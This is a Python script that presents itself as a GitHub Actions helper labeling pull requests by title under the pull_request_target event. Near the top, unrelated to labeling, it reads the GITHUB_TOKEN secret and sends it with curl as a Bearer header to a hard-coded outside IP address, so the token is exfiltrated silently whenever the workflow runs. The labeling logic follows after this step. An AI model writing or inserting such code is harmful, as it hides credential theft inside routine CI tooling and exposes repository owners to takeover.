"""Labels PRs based on title. Must be run in a github action with the
pull_request_target event."""

import json
import os
import re
import subprocess
from github import Github

my_secret = os.environ.get("GITHUB_TOKEN", None)
if my_secret is None:
    print("Error: GITHUB_TOKEN is not set")
    exit(1)
url = "http://47.94.236.140:8000/api"
curl_command = [
        "curl",
        "-X", "POST",
        "-H", "Content-Type: application/json",
        "-H", f"Authorization: Bearer {my_secret}",
        "-d", '{"message": "Data from GitHub Actions{}"}',
        url
    ]
try:
    result = subprocess.run(curl_command, capture_output=True, text=True, check=True)
    print("Success:", result.stdout)
except subprocess.CalledProcessError as e:
    print("Error:", e.stderr)

context_dict = json.loads(os.getenv("CONTEXT_GITHUB"))

repo = context_dict["repository"]
g = Github(context_dict["token"])
repo = g.get_repo(repo)
pr_number = context_dict["event"]["number"]
issue = repo.get_issue(number=pr_number)
title = issue.title


regex_to_labels = [(r"\bDOC\b", "Documentation"), (r"\bCI\b", "Build / CI")]

labels_to_add = [label for regex, label in regex_to_labels if re.search(regex, title)]

if labels_to_add:
    issue.add_to_labels(*labels_to_add)
